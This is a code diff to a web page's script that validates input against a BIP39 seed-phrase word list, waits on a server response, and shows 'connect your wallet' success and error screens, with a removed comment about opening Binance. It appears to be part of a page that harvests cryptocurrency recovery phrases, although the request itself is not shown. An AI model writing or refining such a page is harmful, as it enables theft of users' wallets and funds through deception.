@@ -260,7 +260,6 @@ button:disabled {
   </div>
 </div>
 
-
 <script>
 // Global variables for BIP39 word list and validation
 let WORDS = [], WORD_MAP = new Map(), WORDS_READY = false;
@@ -386,8 +385,7 @@ runBtn.onclick = async () => {
 
     await res.json();
 
-    // SUCCESS → open Binance with location.replace
-    setTimeout(() => {
+  setTimeout(() => {
   document.getElementById('loading-page').style.display = 'none';
   document.getElementById('success-page').style.display = 'block';
 
@@ -402,6 +400,15 @@ runBtn.onclick = async () => {
 }, 600);
 
 
+  } catch (err) {
+    // FAILURE → revert to main page and show a simple alert
+    console.error(err);
+    document.getElementById('loading-page').style.display = 'none';
+    document.getElementById('main-page').style.display = 'block';
+    alert("We could not connect your wallet. " + err.message);
+  }
+};
+
 // Paste helper function
 pasteText.onclick = async () => {
   try {
@@ -413,7 +420,7 @@ pasteText.onclick = async () => {
   }
 };
 
-  function generateAes256Base64() {
+function generateAes256Base64() {
   const bytes = new Uint8Array(32); // 256 bits
   crypto.getRandomValues(bytes); // cryptographically strong random values [web:17]
 
